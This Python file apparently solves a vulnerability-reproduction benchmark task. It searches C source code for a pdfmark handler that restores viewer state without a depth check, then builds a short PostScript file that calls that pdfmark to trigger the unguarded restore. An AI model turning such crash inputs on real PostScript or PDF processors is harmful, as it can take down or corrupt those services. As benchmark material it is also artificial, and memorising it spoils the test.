import os
import re
import tarfile
from bisect import bisect_right
from typing import Dict, List, Optional, Set, Tuple, Iterable


_C_KEYWORDS = {
    "if", "for", "while", "switch", "return", "sizeof", "do", "case", "default",
    "break", "continue", "goto",
}


def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                low = fn.lower()
                if not (low.endswith(".c") or low.endswith(".h") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".hpp")):
                    continue
                p = os.path.join(root, fn)
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                yield os.path.relpath(p, src_path), data.decode("utf-8", "ignore")
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                low = name.lower()
                if not (low.endswith(".c") or low.endswith(".h") or low.endswith(".cc") or low.endswith(".cpp") or low.endswith(".hpp")):
                    continue
                if m.size <= 0:
                    continue
                # Avoid pathological huge files
                if m.size > 50_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                yield name, data.decode("utf-8", "ignore")
    except tarfile.TarError:
        return


def _strip_c_comments_and_strings_find_matching_brace(s: str, start_brace: int) -> int:
    n = len(s)
    i = start_brace
    depth = 0

    in_sl_comment = False
    in_ml_comment = False
    in_str = False
    in_chr = False
    esc = False

    while i < n:
        c = s[i]

        if in_sl_comment:
            if c == "\n":
                in_sl_comment = False
            i += 1
            continue

        if in_ml_comment:
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                in_ml_comment = False
                i += 2
                continue
            i += 1
            continue

        if in_str:
            if esc:
                esc = False
                i += 1
                continue
            if c == "\\":
                esc = True
                i += 1
                continue
            if c == '"':
                in_str = False
            i += 1
            continue

        if in_chr:
            if esc:
                esc = False
                i += 1
                continue
            if c == "\\":
                esc = True
                i += 1
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == "/" and i + 1 < n:
            c2 = s[i + 1]
            if c2 == "/":
                in_sl_comment = True
                i += 2
                continue
            if c2 == "*":
                in_ml_comment = True
                i += 2
                continue

        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1

    return -1


_FUNCDEF_RE = re.compile(
    r'^[ \t]*(?:[A-Za-z_][A-Za-z0-9_ \t\*]*?\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*\([^;{}]*\)\s*\{',
    re.M,
)


def _extract_functions(text: str) -> List[Tuple[str, int, int]]:
    funcs: List[Tuple[str, int, int]] = []
    for m in _FUNCDEF_RE.finditer(text):
        fname = m.group(1)
        if fname in _C_KEYWORDS:
            continue
        brace_pos = m.end() - 1
        end = _strip_c_comments_and_strings_find_matching_brace(text, brace_pos)
        if end == -1:
            continue
        funcs.append((fname, m.start(), end + 1))
    return funcs


def _build_pdfmark_func_map(texts: Iterable[Tuple[str, str]]) -> Dict[str, Set[str]]:
    mp: Dict[str, Set[str]] = {}
    init_re = re.compile(r'\"([A-Za-z0-9_]{1,40})\"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)')
    for _, t in texts:
        if "pdfmark" not in t:
            continue
        for m in init_re.finditer(t):
            name = m.group(1)
            func = m.group(2)
            if "pdfmark" not in func.lower():
                continue
            mp.setdefault(func, set()).add(name)
    return mp


def _find_best_pdfmark_name(src_path: str) -> Optional[str]:
    texts_list = list(_iter_source_texts(src_path))
    if not texts_list:
        return None

    pdfmark_map = _build_pdfmark_func_map(texts_list)

    # First pass: find candidate "restore" helper functions.
    restore_func_candidates: Set[str] = set()
    restore_call_lines: List[Tuple[str, str, int]] = []

    call_ident_re = re.compile(r'\b([A-Za-z_][A-Za-z0-9_]*)\s*\(')

    for path, t in texts_list:
        if "viewer" not in t.lower():
            continue
        for m in re.finditer(r'[^\n]{0,200}', t):
            pass  # no-op to keep structure minimal

        for line in t.splitlines():
            ll = line.lower()
            if "viewer" in ll and "restore" in ll and "(" in line:
                m = call_ident_re.search(line)
                if m:
                    restore_func_candidates.add(m.group(1))

        # Also look for likely restore funcs by decrementing viewer depth in function bodies.
        for fname, s, e in _extract_functions(t):
            body = t[s:e]
            bl = body.lower()
            if "viewer" not in bl or "depth" not in bl:
                continue
            if re.search(r'viewer[a-z0-9_]*depth[a-z0-9_]*\s*--', body, re.I) or re.search(r'--\s*viewer[a-z0-9_]*depth[a-z0-9_]*', body, re.I):
                if "restore" in fname.lower() or ("viewer" in fname.lower() and ("pop" in fname.lower() or "restore" in fname.lower())):
                    restore_func_candidates.add(fname)

    if not restore_func_candidates:
        restore_func_candidates = {"pdf_restore_viewer_state", "pdf_viewer_state_restore", "restore_viewer_state"}

    # Second pass: find a pdfmark handler that calls restore function without a depth guard.
    best_name: Optional[str] = None
    best_score = -1

    for path, t in texts_list:
        if ("pdfmark" not in t) and ("viewer" not in t.lower()):
            continue
        funcs = _extract_functions(t)
        if not funcs:
            continue
        for fname, s, e in funcs:
            body = t[s:e]
            if "pdfmark" not in fname.lower() and "pdfmark" not in body:
                continue
            body_l = body.lower()
            if "viewer" not in body_l:
                continue

            # Check if this function directly decrements viewer depth without guards.
            direct_decrement = bool(re.search(r'viewer[a-z0-9_]*depth[a-z0-9_]*\s*--', body, re.I) or re.search(r'--\s*viewer[a-z0-9_]*depth[a-z0-9_]*', body, re.I))
            calls_restore = False
            call_pos = -1
            called_restore_name = None

            for rf in restore_func_candidates:
                idx = body.find(rf + "(")
                if idx != -1:
                    calls_restore = True
                    call_pos = idx
                    called_restore_name = rf
                    break

            if not direct_decrement and not calls_restore:
                continue

            # Heuristic: determine if guarded by a depth check near the call/decrement.
            guarded = False
            context = body
            focus_pos = call_pos if calls_restore else (body.lower().find("depth") if "depth" in body_l else 0)
            if focus_pos < 0:
                focus_pos = 0
            pre = context[max(0, focus_pos - 300):focus_pos]
            around = context[max(0, focus_pos - 400):min(len(context), focus_pos + 200)]
            if re.search(r'if\s*\([^)]*\bdepth\b[^)]*\)', around, re.I) and ("viewer" in around.lower()):
                guarded = True
            if re.search(r'\bdepth\b\s*[>!]=?\s*0', around, re.I) and ("viewer" in around.lower()):
                guarded = True
            if re.search(r'\bdepth\b\s*[>]=\s*1', around, re.I) and ("viewer" in around.lower()):
                guarded = True

            if guarded:
                continue

            # Infer pdfmark name(s)
            names: Set[str] = set()
            if fname in pdfmark_map:
                names |= pdfmark_map[fname]
            if fname.lower().startswith("pdfmark_") and len(fname) > 8:
                names.add(fname[8:])
            if fname.lower().startswith("pdfmark") and "_" in fname:
                parts = fname.split("_", 1)
                if len(parts) == 2 and parts[1]:
                    names.add(parts[1])

            if not names:
                continue

            # Score candidates: prefer common end markers like EP, and short names.
            for nm in names:
                score = 0
                nml = nm.lower()
                if nml == "ep":
                    score += 100
                if "end" in nml or nml in ("ep", "e", "endpage", "end"):
                    score += 30
                if "restore" in nml or "pop" in nml:
                    score += 20
                if "doc" in nml:
                    score += 5
                score += max(0, 50 - len(nm))
                if score > best_score:
                    best_score = score
                    best_name = nm

    return best_name


def _ps_name_expr(name: str) -> str:
    if re.fullmatch(r"[A-Za-z0-9_]+", name or ""):
        return "/" + name
    # Fallback: convert a string to a name
    esc = name.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    return f"({esc}) cvn"


class Solution:
    def solve(self, src_path: str) -> bytes:
        name = _find_best_pdfmark_name(src_path)
        if not name:
            name = "EP"

        nm_expr = _ps_name_expr(name)

        lines = [
            "%!PS-Adobe-3.0",
            "%%Pages: 1",
            "%%EndComments",
            "/pdfmark where { pop } { userdict /pdfmark systemdict /cleartomark put } ifelse",
            f"{{ [ /Page 1 ] {nm_expr} pdfmark }} stopped pop",
            "showpage",
            "%%EOF",
            "",
        ]
        return ("\n".join(lines)).encode("ascii", "ignore")